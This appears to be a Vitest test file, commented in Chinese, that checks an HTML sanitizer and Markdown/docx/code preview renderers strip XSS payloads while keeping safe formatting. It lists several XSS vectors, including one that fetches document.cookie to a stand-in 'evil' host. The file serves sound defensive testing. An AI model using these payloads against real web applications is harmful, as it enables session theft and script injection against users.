// @vitest-environment jsdom
// 消毒有效性证据（P0-B 修复 1/2）：
// 证明 Markdown 预览（renderMarkdown）与文档管道共用的 sanitizeHtml 能拦下
// 剪贴板/跨设备可控内容里的可执行 payload。断言口径：输出里不再含
// onerror / onload / javascript: / <script，且安全排版（标题 id 锚点、粗体、安全链接）保留。
import { describe, it, expect } from 'vitest'
import { sanitizeHtml } from '@/utils/html'
import { renderMarkdown, renderCode, ensureHeadingIds } from '@/utils/docPreview'

const XSS_PAYLOADS = [
  '<img src=x onerror=alert(1)>',
  '<script>alert(1)</script>',
  '<a href="javascript:alert(1)">click</a>',
  '<svg onload=alert(1)>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<body onload=alert(1)>',
  '"><img src=x onerror=alert(1)>',
  '<img src=x onerror="fetch(\'http://evil/'+ '\' +document.cookie)">',
]

function assertInert(html: string) {
  const lower = html.toLowerCase()
  expect(lower).not.toContain('onerror')
  expect(lower).not.toContain('onload')
  expect(lower).not.toContain('javascript:')
  expect(lower).not.toContain('<script')
  expect(lower).not.toContain('<iframe')
}

describe('sanitizeHtml — 直接消毒', () => {
  for (const p of XSS_PAYLOADS) {
    it(`拦截 payload: ${p.slice(0, 40)}`, () => {
      assertInert(sanitizeHtml(p))
    })
  }

  it('保留安全排版（b/i/a href=https/ul）', () => {
    const out = sanitizeHtml('<p><b>bold</b> <a href="https://example.com">link</a></p><ul><li>x</li></ul>')
    expect(out).toContain('<b>bold</b>')
    expect(out).toContain('href="https://example.com"')
    expect(out).toContain('<li>x</li>')
  })
})

describe('renderMarkdown — Markdown 预览（S0-1 主利用面）', () => {
  it('# 标题 + <img onerror> 嗅探为 Markdown 的路径被消毒', () => {
    const out = renderMarkdown('# Title\n<img src=x onerror=alert(1)>')
    assertInert(out)
    // 标题仍渲染出来（内容没被整体吞掉）
    expect(out.toLowerCase()).toContain('<h1')
    expect(out).toContain('Title')
  })

  it('markdown 链接的 javascript: 协议被清除', () => {
    const out = renderMarkdown('[点我](javascript:alert(1))')
    assertInert(out)
  })

  it('内嵌 <script> 代码块外的原始 HTML 被清除', () => {
    const out = renderMarkdown('正常文本\n\n<script>alert(1)</script>\n\n<script>document.write(1)</script>')
    assertInert(out)
    expect(out).toContain('正常文本')
  })

  it('svg/onload payload 被清除', () => {
    assertInert(renderMarkdown('<svg onload=alert(1)></svg>'))
  })

  it('保留标题 id 锚点（TOC 跳转不因消毒而失效）', () => {
    const out = renderMarkdown('## 我的标题')
    expect(out).toMatch(/<h2[^>]*id="[^"]+"/)
    expect(out).toContain('我的标题')
  })

  it('保留正常 markdown 排版（粗体/列表/链接）', () => {
    const out = renderMarkdown('**粗体**\n\n- 项目一\n- 项目二\n\n[safe](https://example.com)')
    expect(out).toContain('<strong>粗体</strong>')
    expect(out).toContain('<li>项目一</li>')
    expect(out).toContain('href="https://example.com"')
  })
})

describe('docx 管道（S1-1）— ensureHeadingIds + sanitizeHtml', () => {
  it('mammoth 风格输出里的属性型 payload 被清除', () => {
    const mammothLike =
      '<h1>Doc</h1><p onclick="alert(1)">hi</p><img src=x onerror=alert(1)><a href="javascript:alert(1)">x</a>'
    const out = sanitizeHtml(ensureHeadingIds(mammothLike))
    assertInert(out)
    expect(out.toLowerCase()).not.toContain('onclick')
    expect(out).toContain('Doc')
  })

  it('mammoth 内联的 data:image 图片不被误杀（docx 图片预览不回退）', () => {
    const out = sanitizeHtml('<p><img src="data:image/png;base64,iVBORw0KGgo=" alt="pic" /></p>')
    expect(out).toContain('data:image/png;base64,')
    expect(out.toLowerCase()).toContain('<img')
  })

  it('保留标题结构（供 extractHtmlToc 抽目录）', () => {
    const out = sanitizeHtml(ensureHeadingIds('<h2>章节一</h2><p>正文</p>'))
    expect(out.toLowerCase()).toContain('<h2')
    expect(out).toContain('章节一')
    expect(out).toContain('正文')
  })
})

describe('renderCode（CodePreview 既有转义路径复核）', () => {
  it('hljs 输出对用户可控内容是惰性的（无未转义的活标签）', () => {
    const out = renderCode('<img src=x onerror=alert(1)>\n<script>alert(1)</script>', 'snippet.html')
    const lower = out.toLowerCase()
    // hljs 把 < 转义成 &lt;：不允许出现活的 <img / <script 标签（onerror 作为纯文本残留是惰性的）
    expect(lower).not.toContain('<img')
    expect(lower).not.toContain('<script')
    expect(lower).toContain('&lt;')
  })
})
